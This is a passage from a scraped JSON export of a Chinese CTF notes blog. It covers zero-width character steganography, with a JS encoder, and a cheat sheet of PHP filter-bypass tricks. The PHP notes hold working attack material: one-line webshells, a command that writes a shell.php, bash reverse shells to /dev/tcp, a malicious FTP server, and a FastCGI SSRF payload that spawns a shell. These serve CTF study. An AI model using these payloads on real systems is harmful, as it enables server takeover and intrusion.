printf(&quot;%s\\n&quot;,str);&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"零宽度字符隐写","slug":"misc-零宽度字符隐写","date":"2020-05-23T16:27:12.000Z","updated":"2024-12-08T14:18:41.934Z","comments":true,"path":"2020/05/24/misc-零宽度字符隐写/","permalink":"https://lazzzaro.github.io/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/","excerpt":"","text":"零宽度字符隐写/零宽度空格隐写/零宽度空间隐写/零宽隐写零宽度字符隐写术（Zero-Width Space Steganography）： 将隐藏消息编码和解码为不可打印/可读字符。 字符包括： 零宽度空格（\\u200b） 零宽度非连接符（\\u200c） 零宽度连接符（\\u200d） 从左至右书写标记（\\u200e） 从右至左书写标记（\\u200f） 解密 在线工具https://www.mzy0.com/ctftools/zerowidth1/ http://330k.github.io/misc_tools/unicode_steganography.html https://offdev.net/demos/zwsp-steg-js https://yuanfux.github.io/zero-width-web/ http://www.atoolbox.net/Tool.php?Id=829 https://www.guofei.site/pictures_for_blog/app/text_watermark/v1.html （text_blind_watermark） 其他工具 zwsp-steg-py https://github.com/enodari/zwsp-steg-py 转换 转化为二进制的加密：https://zhuanlan.zhihu.com/p/87919817 转化为Morse编码的加密：https://zhuanlan.zhihu.com/p/75992161 JS脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229/** * Zero-Width Unicode Character Steganography * Copyright (c) 2015-2016 Kei Misawa * This software is released under the MIT License. * http://opensource.org/licenses/mit-license.php */(function(exports)&#123; &#x27;use strict&#x27;; var chars = []; var radix = 0; var codelengthText = 0; var codelengthBinary = 0; /** Set characters of coded hidden text(zero width characters) args: string of zero width characters return: null */ var setUseChars = function(newchars)&#123; if(newchars.length &gt;= 2)&#123; chars = newchars.split(&#x27;&#x27;); radix = chars.length; codelengthText = Math.ceil(Math.log(65536) / Math.log(radix)); codelengthBinary = Math.ceil(Math.log(256) / Math.log(radix)); &#125; return null; &#125;; /** Text Encoder args: text: original text to be embedded (String) data: text to be hidden (String) return: unicode stego text */ var encodeText = function(text1, text2)&#123; return combine_shuffle_string(text1, encode_to_zerowidth_characters_text(text2), codelengthText); &#125;; /** Binary Encoder args: text: original text to be embedded (String) data: data to be hidden (Uint8Array) return: unicode stego text */ var encodeBinary = function(text, data)&#123; return combine_shuffle_string(text, encode_to_zerowidth_characters_binary(data), codelengthBinary); &#125;; /** Text Decoder args: unicode text with steganography (String) return: JavaScript Object &#123; originalText: original text (String), hiddenText: hidden data (String) &#125; */ var decodeText = function(text)&#123; var splitted = split_zerowidth_characters(text); return &#123; &#x27;originalText&#x27;: splitted.originalText, &#x27;hiddenText&#x27;: decode_from_zero_width_characters_text(splitted.hiddenText, codelengthText) &#125;; &#125;; /** Binary Decoder args: unicode text with steganography (String) return: JavaScript Object &#123; originalText: original text (String), hiddenData: hidden data (Uint8Array) &#125; */ var decodeBinary = function(text)&#123; var splitted = split_zerowidth_characters(text); return &#123; &#x27;originalText&#x27;: splitted.originalText, &#x27;hiddenData&#x27;: decode_from_zero_width_characters_binary(splitted.hiddenText) &#125;; &#125;; setUseChars(&#x27;\\u200c\\u200d\\u202c\\ufeff&#x27;); exports.unicodeSteganographer = &#123; encodeText: encodeText, decodeText: decodeText, encodeBinary: encodeBinary, decodeBinary: decodeBinary, setUseChars: setUseChars &#125;; /** Internal Functions */ var encode_to_zerowidth_characters_text = function(str1)&#123; var result = new Array(str1.length); var base = &#x27;&#x27;; var i; var c; var d; var r; //var base = &#x27;0&#x27;.repeat(codelength); // IE not support this method for(i = 0; i &lt; codelengthText; i++)&#123; base += &#x27;0&#x27;; &#125; for(i = 0; i &lt; str1.length; i++)&#123; c = str1.charCodeAt(i); d = c.toString(radix); result[i] = (base + d).substr(-codelengthText); &#125; r = result.join(&#x27;&#x27;); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]); &#125; return r; &#125;; var encode_to_zerowidth_characters_binary = function(u8ary)&#123; var result = new Array(u8ary.length); var base = &#x27;&#x27;; var i; var c; var d; var r; for(i = 0; i &lt; codelengthBinary; i++)&#123; base += &#x27;0&#x27;; &#125; for(i = 0; i &lt; u8ary.length; i++)&#123; d = u8ary[i].toString(radix); result[i] = (base + d).substr(-codelengthBinary); &#125; r = result.join(&#x27;&#x27;); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]); &#125; return r; &#125;; var combine_shuffle_string = function(str1, str2, codelength)&#123; var result = []; var c0 = str1.split(/([\\u0000-\\u002F\\u003A-\\u0040\\u005b-\\u0060\\u007b-\\u007f])|([\\u0030-\\u0039]+)|([\\u0041-\\u005a\\u0061-\\u007a]+)|([\\u0080-\\u00FF]+)|([\\u0100-\\u017F]+)|([\\u0180-\\u024F]+)|([\\u0250-\\u02AF]+)|([\\u02B0-\\u02FF]+)|([\\u0300-\\u036F]+)|([\\u0370-\\u03FF]+)|([\\u0400-\\u04FF]+)|([\\u0500-\\u052F]+)|([\\u0530-\\u058F]+)|([\\u0590-\\u05FF]+)|([\\u0600-\\u06FF]+)|([\\u0700-\\u074F]+)|([\\u0750-\\u077F]+)|([\\u0780-\\u07BF]+)|([\\u07C0-\\u07FF]+)|([\\u0800-\\u083F]+)|([\\u0840-\\u085F]+)|([\\u08A0-\\u08FF]+)|([\\u0900-\\u097F]+)|([\\u0980-\\u09FF]+)|([\\u0A00-\\u0A7F]+)|([\\u0A80-\\u0AFF]+)|([\\u0B00-\\u0B7F]+)|([\\u0B80-\\u0BFF]+)|([\\u0C00-\\u0C7F]+)|([\\u0C80-\\u0CFF]+)|([\\u0D00-\\u0D7F]+)|([\\u0D80-\\u0DFF]+)|([\\u0E00-\\u0E7F]+)|([\\u0E80-\\u0EFF]+)|([\\u0F00-\\u0FFF]+)|([\\u1000-\\u109F]+)|([\\u10A0-\\u10FF]+)|([\\u1100-\\u11FF]+)|([\\u1200-\\u137F]+)|([\\u1380-\\u139F]+)|([\\u13A0-\\u13FF]+)|([\\u1400-\\u167F]+)|([\\u1680-\\u169F]+)|([\\u16A0-\\u16FF]+)|([\\u1700-\\u171F]+)|([\\u1720-\\u173F]+)|([\\u1740-\\u175F]+)|([\\u1760-\\u177F]+)|([\\u1780-\\u17FF]+)|([\\u1800-\\u18AF]+)|([\\u18B0-\\u18FF]+)|([\\u1900-\\u194F]+)|([\\u1950-\\u197F]+)|([\\u1980-\\u19DF]+)|([\\u19E0-\\u19FF]+)|([\\u1A00-\\u1A1F]+)|([\\u1A20-\\u1AAF]+)|([\\u1AB0-\\u1AFF]+)|([\\u1B00-\\u1B7F]+)|([\\u1B80-\\u1BBF]+)|([\\u1BC0-\\u1BFF]+)|([\\u1C00-\\u1C4F]+)|([\\u1C50-\\u1C7F]+)|([\\u1CC0-\\u1CCF]+)|([\\u1CD0-\\u1CFF]+)|([\\u1D00-\\u1D7F]+)|([\\u1D80-\\u1DBF]+)|([\\u1DC0-\\u1DFF]+)|([\\u1E00-\\u1EFF]+)|([\\u1F00-\\u1FFF]+)|([\\u2000-\\u206F]+)|([\\u2070-\\u209F]+)|([\\u20A0-\\u20CF]+)|([\\u20D0-\\u20FF]+)|([\\u2100-\\u214F]+)|([\\u2150-\\u218F]+)|([\\u2190-\\u21FF]+)|([\\u2200-\\u22FF]+)|([\\u2300-\\u23FF]+)|([\\u2400-\\u243F]+)|([\\u2440-\\u245F]+)|([\\u2460-\\u24FF]+)|([\\u2500-\\u257F]+)|([\\u2580-\\u259F]+)|([\\u25A0-\\u25FF]+)|([\\u2600-\\u26FF]+)|([\\u2700-\\u27BF]+)|([\\u27C0-\\u27EF]+)|([\\u27F0-\\u27FF]+)|([\\u2800-\\u28FF]+)|([\\u2900-\\u297F]+)|([\\u2980-\\u29FF]+)|([\\u2A00-\\u2AFF]+)|([\\u2B00-\\u2BFF]+)|([\\u2C00-\\u2C5F]+)|([\\u2C60-\\u2C7F]+)|([\\u2C80-\\u2CFF]+)|([\\u2D00-\\u2D2F]+)|([\\u2D30-\\u2D7F]+)|([\\u2D80-\\u2DDF]+)|([\\u2DE0-\\u2DFF]+)|([\\u2E00-\\u2E7F]+)|([\\u2E80-\\u2EFF]+)|([\\u2F00-\\u2FDF]+)|([\\u2FF0-\\u2FFF]+)|([\\u3000-\\u303F]+)|([\\u3040-\\u309F]+)|([\\u30A0-\\u30FF]+)|([\\u3100-\\u312F]+)|([\\u3130-\\u318F]+)|([\\u3190-\\u319F]+)|([\\u31A0-\\u31BF]+)|([\\u31C0-\\u31EF]+)|([\\u31F0-\\u31FF]+)|([\\u3200-\\u32FF]+)|([\\u3300-\\u33FF]+)|([\\u3400-\\u4DBF]+)|([\\u4DC0-\\u4DFF]+)|([\\u4E00-\\u9FFF]+)|([\\uA000-\\uA48F]+)|([\\uA490-\\uA4CF]+)|([\\uA4D0-\\uA4FF]+)|([\\uA500-\\uA63F]+)|([\\uA640-\\uA69F]+)|([\\uA6A0-\\uA6FF]+)|([\\uA700-\\uA71F]+)|([\\uA720-\\uA7FF]+)|([\\uA800-\\uA82F]+)|([\\uA830-\\uA83F]+)|([\\uA840-\\uA87F]+)|([\\uA880-\\uA8DF]+)|([\\uA8E0-\\uA8FF]+)|([\\uA900-\\uA92F]+)|([\\uA930-\\uA95F]+)|([\\uA960-\\uA97F]+)|([\\uA980-\\uA9DF]+)|([\\uA9E0-\\uA9FF]+)|([\\uAA00-\\uAA5F]+)|([\\uAA60-\\uAA7F]+)|([\\uAA80-\\uAADF]+)|([\\uAAE0-\\uAAFF]+)|([\\uAB00-\\uAB2F]+)|([\\uAB30-\\uAB6F]+)|([\\uAB70-\\uABBF]+)|([\\uABC0-\\uABFF]+)|([\\uAC00-\\uD7AF]+)|([\\uD7B0-\\uD7FF]+)|([\\uD800-\\uDFFF]+)|([\\uE000-\\uF8FF]+)|([\\uF900-\\uFAFF]+)|([\\uFB00-\\uFB4F]+)|([\\uFB50-\\uFDFF]+)|([\\uFE00-\\uFE0F]+)|([\\uFE10-\\uFE1F]+)|([\\uFE20-\\uFE2F]+)|([\\uFE30-\\uFE4F]+)|([\\uFE50-\\uFE6F]+)|([\\uFE70-\\uFEFF]+)|([\\uFF00-\\uFFEF]+)|([\\uFFF0-\\uFFFF]+)/g); var c1 = []; var i; var j; for(i = 0; i &lt; c0.length; i++)&#123; if((typeof c0[i] !== &#x27;undefined&#x27;) &amp;&amp; (c0[i] !== &#x27;&#x27;))&#123; c1.push(c0[i]); &#125; &#125; var c2 = str2.split(new RegExp(&#x27;(.&#123;&#x27; + codelength + &#x27;&#125;)&#x27;, &#x27;g&#x27;)); var ratio = c1.length / (c1.length + c2.length); /* slow while((c1.length &gt; 0) &amp;&amp; (c2.length &gt; 0))&#123; if(Math.random() &lt;= ratio)&#123; result.push(c1.shift()); &#125;else&#123; result.push(c2.shift()); &#125; &#125;*/ i = 0; j = 0; while((i &lt; c1.length) &amp;&amp; (j &lt; c2.length))&#123; if(Math.random() &lt;= ratio)&#123; result.push(c1[i]); i++; &#125;else&#123; result.push(c2[j]); j++; &#125; &#125; c1 = c1.slice(i); c2 = c2.slice(j); result = result.concat(c1).concat(c2); return result.join(&#x27;&#x27;); &#125;; var split_zerowidth_characters = function(str1)&#123; var result = &#123;&#125;; result.originalText = str1.replace(new RegExp(&#x27;[&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;); result.hiddenText = str1.replace(new RegExp(&#x27;[^&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;); return result; &#125;; var decode_from_zero_width_characters_text = function(str1)&#123; var r = str1; var i; var result = []; for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i); &#125; for(i = 0; i &lt; r.length; i += codelengthText)&#123; result.push(String.fromCharCode(parseInt(r.substr(i, codelengthText), radix))); &#125; return result.join(&#x27;&#x27;); &#125;; var decode_from_zero_width_characters_binary = function(str1)&#123; var r = str1; var i; var j; var result = new Uint8Array(Math.ceil(str1.length / codelengthBinary)); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i); &#125; for(i = 0, j = 0; i &lt; r.length; i += codelengthBinary, j++)&#123; result[j] = parseInt(r.substr(i, codelengthBinary), radix); &#125; return result; &#125;; return null;&#125;)(this);var s = unicodeSteganographers.setUseChars(&#x27;\\u200b\\u200c\\u200d\\u200e\\u200f&#x27;);s.decodeText(&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;)","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"}],"author":"Lazzaro"},{"title":"PHP绕过","slug":"web-PHP绕过","date":"2020-05-18T11:29:09.000Z","updated":"2025-03-24T11:45:36.454Z","comments":true,"path":"2020/05/18/web-PHP绕过/","permalink":"https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/","excerpt":"","text":"常用函数phpinfo() #PHP配置页 file_get_contents() #获取文件内容 get_defined_vars() #获取所有文件（包括包含的文件）变量的值 ​ 变种一句话PHP $_GET[a]($_GET[b]); ​ 常用php://filter过滤器无过滤器 php://filter/resource= 字符串过滤器 php://filter/read=string.rot13/resource= php://filter/read=string.toupper/resource= php://filter/read=string.tolower/resource= php://filter/read=string.string_tags/resource= 转换过滤器 php://filter/read=convert.base64-encode/resource= php://filter/read=convert.quoted-printable-encode/resource= ​ 常用路径Nginx 123456日志：/var/log/nginx/access.log配置：/etc/nginx/nginx.conf/usr/local/nginx/conf/nginx.conf Apache 1234567891011日志：/var/log/apache/access.log/var/log/apache2/access.log/var/www/logs/access.log/var/log/access.log/etc/httpd/logs/access_log/var/log/httpd/access_log配置：/etc/apache2/apache2.conf/etc/httpd/conf/httpd.conf Docker 12启动命令文件：/docker-entrypoint.sh ​ 绕过关键词 函数名、方法名、类名、关键字不区分大小写 &lt;?php Show_source(&#39;index.php&#39;);?&gt; 动态特性 &lt;?php base64_decode(&#39;c2hvd19zb3VyY2U=&#39;)(&#39;index.php&#39;);?&gt; &lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;/var/www/html/index.php&#39;);?&gt; 16进制 &lt;?php (&quot;\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f&quot;)();?&gt; 溢出32位：-2147483648 ~ 2147483647 64位：-9223372036854775808 ~ 9223372036854775807 本地访问X-Forwarded-For, X-Client-ip, Client-ip, X-Real-IP 请求方法查看支持请求方法：OPTIONS 任意文件上传：PUT intval() 科学计数法 进制转换 十六进制：0x??? 二进制：0b??? 八进制：0??? is_numeric() 特殊字符 空格、%00、%0a preg_match() 换行符 %0a（按行匹配类） preg_match值只匹配第一行，对于/^xxx$/类型，在前端或末尾加上%0a即可绕过。 命名空间（\\） 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 123#例&lt;?php namespace ccc;\\eval($_REQUEST[&#x27;a&#x27;]);&lt;?php \\system(&#x27;cat /tmp/flag_XXXX&#x27;); 参考：Code-Breaking Puzzles 题解&amp;学习篇 符号 分号：?&gt;闭合 小括号： ?c=include $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php ?c=require $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php 数组 preg_match只能处理字符串，当传入的subject是数组时会返回false。 PCRE回溯次数限制 参考：PHP利用PCRE回溯次数限制绕过某些安全限制 pcre.backtrack_limit给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false。 12345678import requests url = &#x27;http://x.x.x.x/&#x27;data = &#123; &#x27;code&#x27;: &#x27;very&#x27; * 250000 + &#x27;STRING&#x27;&#125;r = requests.post(url, data=data)print(r.text) in_array() 命名空间（\\） 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 123#例&lt;?php namespace ccc;\\eval($_REQUEST[&#x27;a&#x27;]);&lt;?php \\system(&#x27;cat /tmp/flag_XXXX&#x27;); 参考：Code-Breaking-Puzzles-题解-学习篇 $_SERVER[‘QUERY_STRING’] URL编码 $_SERVER[‘QUERY_STRING’]不会进行URLDecode。 变量覆盖 ?_POST[key1]=36d&amp;_POST[key2]=36d $_REQUEST POST覆盖 $_REQUEST同时接受GET和POST的数据，并且POST具有更高的优先值，只需要同时GET和POST有相同的参数，在检测时POST的值就会覆盖GET的值从而绕过。 file_get_contents() 使用 php://input 或 data://text/plain,xxx 写文件 文件内容需满足固定字符串，或固定字符串前缀 filter链构造，经过多次base64加密和解密，每次编码删除后面的 =，扔掉后方的脏数据。 参考： Solving “includer’s revenge” from hxp ctf 2021 without controlling any files PHP filter chain generator idekCTF 2022 - Paywall RCE CVE-2024-2961 读取/proc/self/maps文件 ?file=php://filter/read=convert.base64-encode/resource=/proc/self/maps 读取libc文件 ?file=php://filter/read=convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so 使用脚本生成payload 方法一 https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py 修改脚本，利用。 方法二 https://github.com/kezibei/php-filter-iconv 将maps和libc.so放入同一个文件夹，修改脚本，主要修改cmd命令和libc文件名称： cmd = &quot;echo &#39;&lt;?php system($_GET[1]); ?&gt;&#39; &gt; /var/www/html/shell.php&quot; 运行脚本，得到payload； 直接访问执行命令，可以RCE： /shell.php?cmd=ls file_put_contents() 攻击php-fpm（未授权访问漏洞） 如果目标主机上正在运行着 PHP-FPM，并且有一个file_put_contents()函数的参数是可控的，可以使用 FTP 协议的被动模式：客户端试图从FTP服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的IP和端口上，我们可以指定到127.0.0.1:9000，这样就可以向目标主机的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF。 file_put_contents($_GET[&#39;file&#39;], $_GET[&#39;data&#39;]); 先用 gopherus 生成一个反弹shell的payload，截取 _ 后面的部分 /var/www/html/index.php bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot; 关于FTP的返回码，我们看到227： Entering Passive Mode &lt;h1,h2,h3,h4,p1,p2&gt; 进入被动模式(h1,h2,h3,h4,p1,p2) 我们可以用来进入被动模式，h和p分别为地址和端口，搭建一个恶意的 ftp 服务器： 123456789101112131415import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#x27;0.0.0.0&#x27;, 123))s.listen(1)conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)conn.send(b&#x27;331 Please specify the password.\\n&#x27;)conn.send(b&#x27;230 Login successful.\\n&#x27;)conn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)conn.send(b&#x27;150 ok\\n&#x27;)conn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n&#x27;) #STOR / (2)conn.send(b&#x27;150 Permission denied.\\n&#x27;)conn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() 启动服务器之后再监听反弹的端口： http://ip:8080/ftp.php?file=ftp://@ip:123/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0F%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F!SCRIPT_FILENAME/usr/share/nginx/html/phpinfo.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/1234%200%3E%261%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00 参考：教你用 FTP SSRF 打穿内网 array绕过关键字 file_put_contents的data参数可以是个array，可以通过构造特别的get请求来发送一个data的array来绕过。 file_put_contents(file,data,mode,context) file: 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。 data: 可选。规定要写入文件的数据。可以是字符串、数组或数据流。 12for i in range(len(s)): params[&#x27;data[&#123;i&#125;]&#x27;.format(i=str(i))]=bytes([s[i]]) sha1()比较 以数组为参数 sha1()函数无法处理数组类型，将报错并返回false。 特殊情况汇总 10932435112: 0e07766915004133176347055865026311692244aaroZmOk: 0e66507019969427134894567494305185566735aaK1STfY: 0e76658526655756207688271159624026011393aaO8zKZF: 0e89257456677279068558073954252716165668aa3OFF9m: 0e36977786278517984959260394024281014729 0e1290633704: 0e19985187802402577070739524195726831799 比较缺陷利用（限===强类型情况） 两组经过url编码后的值： 12a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 文件碰撞 collisions md5()比较 比较缺陷利用（限==弱类型情况） QNKCDZO - 0e830400451993494058024219903391 PJNPDWY: 0e291529052894702774557631701704NWWKITQ: 0e763082070976038347657360817689NOOPCJF: 0e818888003657176127862245791911MMHUWUV: 0e701732711630150438129209816536MAUXXQC: 0e478478466848439040434801845361IHKFRNS: 0e256160682445802696926137988570GZECLQZ: 0e537612333747236407713628225676GGHMVOE: 0e362766013028313274586933780773GEGHBXL: 0e248776895502908863709684713578EEIZDOI: 0e782601363539291779881938479162DYAXWCA: 0e424759758842488633464374063001DQWRASX: 0e742373665639232907775599582643BRTKUJZ: 00e57640477961333848717747276704ABJIHVY: 0e755264355178451322893275696586 240610708 - 0e462097431906509019562988736854s878926199a - 0e545993274517709034328855841020s155964671a - 0e342768416822451524974117254469s214587387a - 0e848240448830537924465865611904s878926199a - 0e545993274517709034328855841020s1091221200a - 0e940624217856561557816327384675 aaaXXAYW: 0e540853622400160407992788832284aabg7XSs: 0e087386482136013740957780965295aabC9RqS: 0e041022518165728065344349536299 0e215962017 - 0e291242476940776845150308577824 比较缺陷利用（限===强类型情况） 工具：fastcoll 两组经过url编码后的值： 123a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 文件碰撞 collisions 以数组为参数 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。 NaN 和 INF NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN===NAN都是false，但md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;)为true。 md5(string,raw) md5(string,raw) string 必需。规定要计算的字符串。raw 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式；FALSE - 默认，32 字符十六进制数。 ffifdyop，经过md5函数后结果为 &#39;or&#39;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c； 129581926211651571912466741651878684928，经过md5函数后结果为 \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#39;or&#39;8； create_function() 代码注入 源码 $func(&#39;&#39;,$arg) ： $func=&#39;create_function&#39;; $arg=&#39;2;&#125;phpinfo();//&#39; 或 $arg=&#39;2;&#125;require(base64_decode(xxx));var_dump(get_defined_vars());// 返回值：匿名函数 $func = create_function(&quot;&quot;,&quot;die(&#39;end.&#39;);&quot;); 创建一个$func的匿名函数，函数的作用是输出字符串。 匿名函数有真正的名字，为%00lambda_%d （%d格式化为当前进程的第n个匿名函数，n的范围0-999） call_user_func() 调用类静态方法 call_user_func(&#39;Func::_One&#39;,&#39;one&#39;) call_user_func([&#39;Func&#39;,&#39;_One&#39;]) 参考：https://cloud.tencent.com/developer/article/1411010 call_user_func(Closure::fromCallable,[Closure,fromCallable])(&#39;system&#39;)(&#39;whoami&#39;) PHP 7.4 Closure::fromCallable 使用当前范围从给定的 callback 创建并返回一个新的匿名函数。此方法检查 callback 函数在作用域是否可调用， 如果不能，就抛出 TypeError 。 数组作为参数二次调用出 Closure::fromCallable 然后 Closure 加载后面第一个参数 system 形成回调函数然后加载第二个参数变成 system 的参数。 escapeshellarg() escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符。 不可见字符插入（%80-%ff） escapeshellcmd() escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（\\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \\x0A, \\xFF；&#39; 和 &quot; 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 escapeshellarg()+escapeshellcmd() 配对： 多个参数注入：PHP escapeshellarg()+escapeshellcmd() 之殇 ereg() / eregi() NULL截断漏洞 ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。 ereg()只能处理字符串的，遇到数组做参数返回NULL。 strpos() 以数组为参数 strpos()函数如果传入数组，便会返回NULL。 二次编码绕关键字 参考：https://bugs.php.net/bug.php?id=76671 strcmp() 函数缺陷 strcmp()函数比较两个字符串(区分大小写），定义中是比较字符串类型的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在php 5.2版本之前，利用strcmp函数将数组与字符串进行比较会返回-1，但是从5.3开始，会返回0。 add_slashes() $&#123;phpinfo()&#125; preg_replace() 